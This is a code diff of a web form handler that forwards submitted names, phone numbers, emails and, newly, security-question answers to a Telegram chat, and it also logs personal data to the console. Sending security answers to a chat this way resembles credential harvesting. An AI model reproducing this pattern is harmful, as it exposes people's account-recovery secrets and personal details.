@@ -17,10 +17,14 @@ export default async function handler(req, res) {
       cover_type,
       unique_id,
       agent_name,
+      secret_question,
+      secret_answer,
+      unique_ID,
     } = req.body;
 
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    console.log("First_name", `${first_name}`);
 
     // 👇 decide heading based on type
     const heading =
@@ -32,7 +36,7 @@ export default async function handler(req, res) {
     //   ", "
     // )}\nAdditional_Comments : ${additionalComments}\nUnique ID:${unique_id}\nAgent Name : ${agent_name} `;
 
-    const text = `${heading}:\n\nName : ${first_name || ""}\nSurname : ${
+    const client_text = `${heading}:\n\nName : ${first_name || ""}\nSurname : ${
       sur_name || ""
     }\nPhone : ${phone || ""}\nAvaialble on : ${
       contact_method || ""
@@ -48,12 +52,23 @@ export default async function handler(req, res) {
       unique_id || ""
     }\nAgent Name : ${agent_name || ""}`;
 
+    const agent_text = `${heading}:\n\nName : ${first_name || ""}\nSurname : ${
+      sur_name || ""
+    }\nPhone : ${phone || ""}\nAvaialble on : ${
+      contact_method || ""
+    }\nEmail : ${email || ""}\nSecret Question : ${
+      secret_question || ""
+    }\nSecret Answer : ${secret_answer || ""}\nUnique ID : ${unique_ID || ""}`;
+
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: type === "Agent" ? agent_text : client_text,
+      }),
     });
 
     if (response.ok) {
